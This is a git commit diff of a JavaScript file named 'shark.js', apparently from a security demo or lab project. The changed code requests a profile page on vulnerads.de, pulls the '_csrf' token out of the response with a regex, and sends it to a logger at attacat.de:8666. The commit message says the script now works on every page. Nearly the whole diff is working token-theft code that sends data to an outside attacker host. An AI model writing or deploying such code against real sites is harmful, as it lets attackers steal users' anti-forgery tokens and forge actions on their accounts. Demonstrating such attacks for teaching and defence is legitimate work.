8664c5bb954fc1658a074cb3fb8fb4a501003f99
Hannes Molsen <mail@hannesmolsen.de>
2020-03-08 17:57:14 +0100

    surfer now works on every page

--- webapps/surfer/shark.js
+++ webapps/surfer/shark.js
@@ -1,10 +1,17 @@
+var getTokenRequest = new XMLHttpRequest();
+
 setTimeout(function(){
-	var csrf_token = document.getElementsByName('_csrf')[0].value;
-    var url = "https://attacat.de:8666/logger/log.jsp?csrf=" + csrf_token;
-	var xmlhttp;
-	if (window.XMLHttpRequest) {
-		xmlhttp=new XMLHttpRequest();
-	}
-	xmlhttp.open("GET",url,true);
-	xmlhttp.send();
+    getTokenRequest.open("GET","https://vulnerads.de/profile");
+    getTokenRequest.onreadystatechange = post_token;
+    getTokenRequest.send();    
 }, 500);
+
+function post_token() {
+    if(getTokenRequest.readyState != XMLHttpRequest.DONE) return;
+    
+    var csrf_token = getTokenRequest.responseText.match(/_csrf" value="([^"]+)/)[1]
+    var url = "https://attacat.de:8666/logger/log.jsp?csrf=" + csrf_token;
+	var xmlhttp = new XMLHttpRequest();
+	xmlhttp.open("GET",url);
+	xmlhttp.send();
+}
